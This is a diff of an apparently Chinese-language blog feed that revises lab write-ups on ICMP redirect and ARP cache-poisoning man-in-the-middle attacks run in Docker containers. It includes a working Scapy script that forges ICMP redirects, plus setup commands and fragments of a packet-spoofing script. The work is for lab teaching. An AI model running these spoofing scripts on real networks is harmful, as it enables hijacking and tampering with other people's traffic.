@@ -68,7 +68,7 @@
       &lt;tr&gt;
           &lt;td&gt;真实路由器&lt;/td&gt;
           &lt;td&gt;10.9.0.1&lt;/td&gt;
-          &lt;td&gt;正常网络转发节点，作为对照路径&lt;/td&gt;
+          &lt;td&gt;正常网络转发节点，作为初始网关&lt;/td&gt;
       &lt;/tr&gt;
       &lt;tr&gt;
           &lt;td&gt;恶意路由器&lt;/td&gt;
@@ -80,13 +80,20 @@
           &lt;td&gt;10.9.0.105&lt;/td&gt;
           &lt;td&gt;伪造 ICMP Redirect 报文，并执行流量监听与篡改&lt;/td&gt;
       &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;目标主机&lt;/td&gt;
+          &lt;td&gt;192.168.60.5&lt;/td&gt;
+          &lt;td&gt;受害者进行通信的主机&lt;/td&gt;
+      &lt;/tr&gt;
   &lt;/tbody&gt;
 &lt;/table&gt;
 &lt;h2 id=&#34;icmp-重定向攻击&#34;&gt;ICMP 重定向攻击
-&lt;/h2&gt;&lt;p&gt;ICMP Redirect 用于局域网优化路径。当主机将数据包发送给网关时，如果网关发现存在更优路径，会返回一个重定向报文，引导主机更新路由缓存。这个机制缺乏认证过程，只要报文结构合法且来源看似可信，就有可能被内核接受，因此可以伪造重定向来进行攻击&lt;/p&gt;
-&lt;p&gt;攻击目标是修改受害者的路由缓存，将这个路由发往目标主机的流量转发到恶意路由器&lt;/p&gt;
+&lt;/h2&gt;&lt;p&gt;ICMP Redirect 用于局域网优化路径。当主机将数据包发送给网关时，如果网关发现存在更优路径，会返回一个重定向报文，引导主机更新路由缓存，之后的数据包就会经过新的网关。这个机制缺乏认证过程，只要报文结构合法且来源看似可信，就有可能被内核接受，因此可以伪造重定向来进行攻击&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;攻击目标是修改受害者的路由缓存，让这个路由发往目标主机的流量途经恶意路由器&lt;/strong&gt;&lt;/p&gt;
 &lt;h3 id=&#34;受害者&#34;&gt;受害者
-&lt;/h3&gt;&lt;p&gt;为了使ICMP重定向报文能够顺利通过受害者内核的合法性校验，需要让受害者持续向目标主机发送数据包&lt;/p&gt;
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;ICMP 重定向并不是无条件生效，需要存在对应的通信流量，否则内核可能直接忽略报文，因此必须让受害者与目标主机报保持通信，这样重定向才有机会实行&lt;/p&gt;
+&lt;/blockquote&gt;
 &lt;p&gt;进入受害者容器，执行ping命令且不中断&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -94,13 +101,27 @@
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo docker exec -it victim-10.9.0.5 bash
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo docker &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; -it victim-10.9.0.5 bash
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ping 192.168.60.5
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;保持通信状态是触发内核接受重定向的前提&lt;/p&gt;
+&lt;/div&gt;&lt;img src=&#34;3.png&#34; style=&#34;width: 100%;&#34; /&gt;
 &lt;h3 id=&#34;攻击者&#34;&gt;攻击者
-&lt;/h3&gt;&lt;p&gt;首先写一个脚本&lt;code&gt;icmp_redirect.py&lt;/code&gt;用来伪造来自网关的 Type 5 报文，指定受害者的流量发往恶意路由器&lt;/p&gt;
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;攻击者需要伪造来自网关的 ICMP Type 5 Redirect 报文，告诉受害者访问目标时改走新的路由。需要满足两个条件：重定向报文必须伪装成网关发送，以及报文中必须包含受害者当前正在进行的通信信息。一般通过抓包监听，ARP 欺骗，局域网嗅探等获取此信息&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;进入攻击者容器&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker exec -it attacker-10.9.0.105 bash
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cd /volumes
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;首先写一个脚本&lt;code&gt;icmp_redirect.py&lt;/code&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
@@ -120,48 +141,41 @@
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;from scapy.all import *
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;scapy.all&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;victim_ip = &amp;#34;10.9.0.5&amp;#34;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;router_ip = &amp;#34;10.9.0.1&amp;#34;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;attacker_ip = &amp;#34;10.9.0.111&amp;#34;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;target_ip = &amp;#34;192.168.60.5&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;victim_ip&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.9.0.5&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;router_ip&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.9.0.1&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;attacker_ip&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.9.0.111&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;target_ip&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.60.5&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ip = IP(src=router_ip, dst=victim_ip)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 构造受害者正在通信的数据包&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;send_packet&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;victim_ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dst&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target_ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ICMP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;icmp = ICMP(type=5, code=1)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 网关发给受害者一个ICMP重定向并附带数据包&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;redirect&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;router_ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dst&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;victim_ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; \
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           &lt;span class=&#34;n&#34;&gt;ICMP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;code&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;gw&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;attacker_ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; \
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           &lt;span class=&#34;n&#34;&gt;send_packet&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ip2 = IP(src=victim_ip, dst=target_ip)
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;send_packet = ip2 / ICMP()
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;redirect = IP(src=router_ip, dst=victim_ip) / \
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           ICMP(type=5, code=1, gw=attacker_ip) / \
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           send_packet
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;send(redirect, count=5, verbose=1)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 发送5次攻击报文&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;redirect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;进入攻击者容器，发送伪造的 ICMP 重定向报文&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;发送伪造的 ICMP 重定向报文&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker exec -it attacker-10.9.0.105 bash
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cd /volumes
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 icmp_redirect.py
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 icmp_redirect.py
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h3 id=&#34;验证&#34;&gt;验证
-&lt;/h3&gt;&lt;p&gt;攻击成功后，在受害者节点查看路由缓存：&lt;/p&gt;
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;原本受害者访问目标主机时的路径为&lt;code&gt;受害者&amp;gt;网关&amp;gt;目标主机&lt;/code&gt;，攻击成功后会变成&lt;code&gt;受害者&amp;gt;攻击者&amp;gt;目标主机&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;攻击成功后，停止受害者机器上的 ping 命令，在受害者容器查看路由缓存&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -170,16 +184,26 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ip route show
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;若出现如下条目：&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;可以看到以下输出&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;192.168.60.5 via 10.9.0.111 dev eth0 cache &amp;lt;redirected&amp;gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;default via 10.9.0.1 dev eth0 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.9.0.0/24 dev eth0 proto kernel scope link src 10.9.0.5 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;192.168.60.0/24 via 10.9.0.11 dev eth0 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;说明路由已被修改，目标流量开始经过攻击者控制的节点。&lt;/p&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;第一行说明默认网关是10.9.0.1&lt;/li&gt;
+&lt;li&gt;第二行说明10.9.0.x 网段就在本地，不需要经过网关，可以直接发送&lt;/li&gt;
+&lt;li&gt;第三行说明访问 192.168.60.x 网段时不走默认网关，而是发给 10.9.0.11&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;说明路由已被修改，目标流量开始经过攻击者控制的节点。&lt;/p&gt;
+&lt;img src=&#34;4.png&#34; style=&#34;width: 100%;&#34; /&gt;
 &lt;h2 id=&#34;中间人攻击mitm&#34;&gt;中间人攻击（MITM）
 &lt;/h2&gt;&lt;p&gt;在路由被重定向后，攻击者已经处于通信路径中间，但默认情况下数据仍然是透明转发的，需要进一步介入数据处理流程。&lt;/p&gt;
 &lt;p&gt;实验中直接在恶意路由器上对数据进行拦截和修改。&lt;/p&gt;
@@ -260,6 +284,14 @@
 &lt;p&gt;中间人攻击依赖对数据路径的完全接管，单纯的流量转发无法达到篡改效果，需要在内核转发与用户态处理之间做切换。&lt;/p&gt;
 &lt;p&gt;从实现上看，攻击链条可以拆分为路径劫持与数据处理两个阶段，两者缺一不可。&lt;/p&gt;
 &lt;/blockquote&gt;
+&lt;p&gt;ICMP Redirect 并不是收到就一定会生效，Linux 内核会检查多个条件，包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Redirect 是否来自默认网关&lt;/li&gt;
+&lt;li&gt;当前是否确实存在对应通信&lt;/li&gt;
+&lt;li&gt;Redirect 中携带的原始数据包是否合法&lt;/li&gt;
+&lt;li&gt;新网关是否与本机处于同一网络&lt;/li&gt;
+&lt;li&gt;路由是否允许被重定向&lt;/li&gt;
+&lt;/ul&gt;
 </description>
         </item>
         <item>
@@ -924,7 +956,7 @@
 &lt;/ul&gt;
 &lt;img src=&#34;3.png&#34; style=&#34;width: 100%;&#34; /&gt;
 &lt;h2 id=&#34;任务一arp-缓存投毒&#34;&gt;任务一：ARP 缓存投毒
-&lt;/h2&gt;&lt;p&gt;ARP 协议用于建立 IP 地址到 MAC 地址的映射关系，但该协议是无状态的，且不具备认证机制。主机在接收到 ARP 报文后，会直接根据其中的 IP-MAC 映射更新本地缓存，而不会验证其真实性。
+&lt;/h2&gt;&lt;p&gt;ARP 协议用于建立 IP 地址到 MAC 地址的映射关系，但这个协议是无状态的，且不具备认证机制。主机在接收到 ARP 报文后，会直接根据其中的 IP-MAC 映射更新本地缓存，而不会验证真实性。
 这意味着攻击者可以通过构造伪造的 ARP 报文，欺骗受害主机修改缓存，从而影响数据的实际转发路径。&lt;/p&gt;
 &lt;h3 id=&#34;task-1aarp-request-进行缓存投毒&#34;&gt;Task 1.A：ARP Request 进行缓存投毒
 &lt;/h3&gt;&lt;blockquote&gt;
@@ -1332,7 +1364,7 @@
 &lt;/blockquote&gt;
 &lt;h3 id=&#34;ip-转发&#34;&gt;IP 转发
 &lt;/h3&gt;&lt;blockquote&gt;
-&lt;p&gt;投毒完成后，攻击者实际上变成A与B的路由器，因此M开不开启IP转发会对A与B的通信产生影响&lt;/p&gt;
+&lt;p&gt;投毒完成后，攻击者已经成为链路中的中间节点，如果不开启 IP 转发，相当于数据被截获但不再继续转发，从而表现为网络中断，包被 M 直接丢弃了&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;原来的终端不动，重新打开一个终端，进入容器M，关闭IP转发&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -1345,9 +1377,6 @@
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;主机A ping主机B，发现大量丢包&lt;/p&gt;
 &lt;img src=&#34;13.png&#34; style=&#34;width: 80%;&#34; /&gt;
-&lt;blockquote&gt;
-&lt;p&gt;此时攻击者已经成为链路中的中间节点，如果不开启 IP 转发，相当于数据被截获但不再继续转发，从而表现为网络中断，包被 M 直接丢弃了&lt;/p&gt;
-&lt;/blockquote&gt;
 &lt;p&gt;攻击者开启IP转发&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1604,10 +1633,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;sniff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;iface&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;eth0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;filter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;prn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;spoof_pkt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;store&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;关闭内核转发并运行脚本&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;如果不关闭，系统会抢在你的脚本之前把包发走，篡改就失效了&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;/div&gt;&lt;p&gt;关闭内核转发并运行脚本，这是为了防止系统抢在你的脚本之前把包发走，篡改就失效了&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -1664,9 +1690,9 @@
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;测试：在 A 输入任意信息，确认 B 能收到，说明连接已建立。之后保持这两个窗口开启&lt;/p&gt;
 &lt;img src=&#34;17.png&#34; style=&#34;width: 60%;&#34; /&gt;
-&lt;p&gt;确认 TCP 连接稳定后，在攻击者 M 中关闭内核转发来切断原生路由，并立即启动中间人脚本接管会话&lt;/p&gt;
+&lt;p&gt;在攻击者 M 中关闭内核转发来切断原生路由，并立即启动中间人脚本接管会话&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;经过测试发现，此环境下即使不先开启再关闭IP转发，而是保持关闭状态，脚本依然可以完成篡改&lt;/p&gt;
+&lt;p&gt;经过测试发现，此环境下即使不先开启再关闭IP转发，而是全程保持关闭状态，脚本依然可以完成篡改&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
